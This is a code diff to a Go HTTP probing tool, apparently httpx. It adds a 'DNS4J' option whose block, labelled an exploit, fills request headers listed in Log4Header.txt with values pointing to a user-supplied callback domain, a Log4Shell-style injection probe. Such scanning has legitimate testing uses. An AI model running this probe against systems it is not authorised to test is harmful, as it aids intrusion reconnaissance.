@@ -10,6 +10,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
+	"log"
 	"net"
 	"net/http"
 	"net/http/httputil"
@@ -95,6 +96,7 @@ func New(options *Options) (*Runner, error) {
 	httpxOptions.UnsafeURI = options.RequestURI
 	httpxOptions.CdnCheck = options.OutputCDN
 	httpxOptions.ExcludeCdn = options.ExcludeCDN
+	httpxOptions.DNS4J = options.DNS4J
 	if options.CustomHeaders.Has("User-Agent:") {
 		httpxOptions.RandomAgent = false
 	} else {
@@ -154,6 +156,9 @@ func New(options *Options) (*Runner, error) {
 		scanopts.RequestBody = rrBody
 		options.rawRequest = string(rawRequest)
 	}
+
+
+
 
 	// disable automatic host header for rawhttp if manually specified
 	// as it can be malformed the best approach is to remove spaces and check for lowercase "host" word
@@ -570,6 +575,7 @@ func (r *Runner) RunEnumeration() {
 				continue
 			}
 
+
 			row := resp.str
 			if r.options.JSONOutput {
 				row = resp.JSON(&r.scanopts)
@@ -634,6 +640,7 @@ func (r *Runner) RunEnumeration() {
 	wgoutput.Wait()
 }
 
+// t is target (hostname from user input)
 func (r *Runner) process(t string, wg *sizedwaitgroup.SizedWaitGroup, hp *httpx.HTTPX, protocol string, scanopts *scanOptions, output chan Result) {
 	protocols := []string{protocol}
 	if scanopts.NoFallback || protocol == httpx.HTTPandHTTPS {
@@ -768,9 +775,11 @@ retry:
 		customHost = parts[1]
 	}
 	URL, err := urlutil.Parse(domain)
+
 	if err != nil {
 		return Result{URL: domain, Input: origInput, err: err}
 	}
+
 
 	// check if we have to skip the host:port as a result of a previous failure
 	hostPort := net.JoinHostPort(URL.Host, URL.Port)
@@ -808,9 +817,14 @@ retry:
 		customHost = URL.Host
 		ctx := context.WithValue(context.Background(), "ip", customIP) //nolint
 		req, err = hp.NewRequestWithContext(ctx, method, URL.String())
+
 	} else {
 		req, err = hp.NewRequest(method, URL.String())
+
 	}
+
+
+
 	if err != nil {
 		return Result{URL: URL.String(), Input: origInput, err: err}
 	}
@@ -818,6 +832,25 @@ retry:
 	if customHost != "" {
 		req.Host = customHost
 	}
+
+	// DNS4J Exploit, maybee need more improvement
+	if hp.Options.DNS4J != "" {
+		head, err := os.Open("Log4Header.txt")
+		if err != nil{
+			gologger.Fatal().Msgf("No input provided: %s", err)
+		}
+		defer head.Close()
+
+		scanner := bufio.NewScanner(head)
+		for scanner.Scan(){
+			hp.CustomHeaders[scanner.Text()] = fmt.Sprintf("%s.%s", URL.Host, hp.Options.DNS4J)
+		}
+		if err := scanner.Err(); err != nil{
+			log.Fatal(err)
+		}
+
+	}
+
 
 	hp.SetCustomHeaders(req, hp.CustomHeaders)
 	// We set content-length even if zero to allow net/http to follow 307/308 redirects (it fails on unknown size)
